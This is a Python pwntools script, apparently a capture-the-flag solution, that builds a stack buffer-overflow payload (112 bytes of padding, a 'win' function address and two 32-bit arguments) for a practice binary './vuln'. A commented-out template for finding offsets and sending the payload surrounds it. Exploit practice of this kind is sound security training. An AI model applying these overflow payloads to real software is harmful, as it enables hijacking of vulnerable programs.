from pwn import *


# # Allows you to switch between local/GDB/remote from terminal
# def start(argv=[], *a, **kw):
#     if args.GDB:  # Set GDBscript below
#         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
#     elif args.REMOTE:  # ('server', 'port')
#         return remote(sys.argv[1], sys.argv[2], *a, **kw)
#     else:  # Run locally
#         return process([exe] + argv, *a, **kw)


# # Find offset to EIP/RIP for buffer overflows
# def find_ip(payload):
#     # Launch process and send payload
#     p = process(exe, level='warn')
#     p.sendlineafter(b'>', payload)
#     # Wait for the process to crash
#     p.wait()
#     # Print out the address of EIP/RIP at the time of crashing
#     # ip_offset = cyclic_find(p.corefile.pc)  # x86
#     ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
#     warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
#     return ip_offset


# # Specify GDB script here (breakpoints etc)
# gdbscript = '''
# init-pwndbg
# continue
# '''.format(**locals())

# # Binary filename
# exe = './vuln'
# # This will automatically get context arch, bits, os etc
# elf = context.binary = ELF(exe, checksec=False)
# # Change logging level to help with debugging (error/warning/info/debug)
# context.log_level = 'debug'

# # ===========================================================
# #                    EXPLOIT GOES HERE
# # ===========================================================

# # Lib-C library, can use pwninit/patchelf to patch binary
# # libc = ELF("./libc.so.6")
# # ld = ELF("./ld-2.27.so")

# # Pass in pattern_size, get back EIP/RIP offset
# offset = cyclic(44)

# # Start program
# io = start()
arg1 = 0xCAFEF00D
arg2 = 0xF00DF00D
win = 0x8049296

payload = 'A' * 112
payload += p32(win)
payload += 'A'*4
payload += p32(arg1)
payload += p32(arg2)
print(payload)
# # Build the payload
# payload = flat({
#     offset: [
#         win,
#         arg1,
#         arg2
#     ]
# })


# print(payload)

# # # Send the payload
# # io.sendlineafter(b':', payload)

# # # Got Shell?
# # io.interactive()
